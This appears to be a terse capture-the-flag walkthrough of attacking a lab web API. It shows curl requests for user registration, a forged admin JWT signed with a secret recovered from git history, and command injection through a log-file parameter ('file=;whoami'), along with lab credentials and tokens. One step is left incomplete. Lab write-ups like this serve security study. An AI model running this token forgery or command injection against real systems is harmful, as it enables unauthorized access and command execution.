

**Enumeration**
```
test
```

Log In 
```
curl -X POST -H 'Content-Type: application/json' -i 'http://10.10.11.120/api/user/login' --data '{
"email": "root@dasith.works",
"password": "Kekc8swFgD6zU"
}'
```
But response returned, wrong password.

Register user
```
curl -X POST -H 'Content-Type: application/json' -i 'http://10.10.11.120/api/user/register' --data '{
"name": "testuser",
"email": "testuser@dasith.works",
"password": "testuser"
}'
```
with response `{"user":"testuser"}`

Log In with these credentials
```
curl -X POST -H 'Content-Type: application/json' -i 'http://10.10.11.120/api/user/login' --data '{
"email": "testuser@dasith.works",
"password": "testuser"
}'
```
with succes and response `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjNmMDE2NDA4MGE4MjA0NWFiNWVjZjMiLCJuYW1lIjoidGVzdHVzZXIiLCJlbWFpbCI6InRlc3R1c2VyQGRhc2l0aC53b3JrcyIsImlhdCI6MTY0ODI5NjM4M30.WdLNQs7gWNqS1-zDfhXstyqoqm7Y2UUXK8E0tkIFkxw`

Try /priv
```
curl -X GET -H 'Content-Type: application/json' -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjNmMDE2NDA4MGE4MjA0NWFiNWVjZjMiLCJuYW1lIjoidGVzdHVzZXIiLCJlbWFpbCI6InRlc3R1c2VyQGRhc2l0aC53b3JrcyIsImlhdCI6MTY0ODI5NjM4M30.WdLNQs7gWNqS1-zDfhXstyqoqm7Y2UUXK8E0tkIFkxw' -i 'http://10.10.11.120/api/priv' --data '{
"email": "testuser@dasith.works",
"password": "testuser"
}'
```
and response is `{"role":{"role":"you are normal user","desc":"testuser"}}`

Try login with forged JWT token with TOKEN_SECRET=secret
```
curl -X GET -H 'Content-Type: application/json' -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjNmMDE2NDA4MGE4MjA0NWFiNWVjZjMiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InRlc3R1c2VyQGRhc2l0aC53b3JrcyIsImlhdCI6MTY0ODI5NjM4M30.DTKfqkj0GUAI46OLUGTwoOnBEgbQ0PkWk9pVMUz95g4' -i 'http://10.10.11.120/api/priv'
```
But rejected

Look in `.git` and find file `logs/HEAD' with commit history and a commit with description `commit: removed .env for security reasons`
Go back to that commit with:

and login
```
curl -X GET -H 'Content-Type: application/json' -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjNmMDE2NDA4MGE4MjA0NWFiNWVjZjMiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InRlc3R1c2VyQGRhc2l0aC53b3JrcyIsImlhdCI6MTY0ODI5NjM4M30.7XoBvpYsxSS4z1nQzHgCmkzGWn5quqV1orfQEPJ9038' -i 'http://10.10.11.120/api/priv'
```

and we're in 
`{"creds":{"role":"admin","username":"theadmin","desc":"welcome back admin"}}`

```
curl -X GET -H 'Content-Type: application/json' -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjNmMDE2NDA4MGE4MjA0NWFiNWVjZjMiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InRlc3R1c2VyQGRhc2l0aC53b3JrcyIsImlhdCI6MTY0ODI5NjM4M30.7XoBvpYsxSS4z1nQzHgCmkzGWn5quqV1orfQEPJ9038' -i 'http://10.10.11.120/api/logs?file=;whoami'
```

and response `"80bf34c fixed typos 🎉\n0c75212 now we can view logs from server 😃\nab3e953 Added the codes\ndasith\n"`
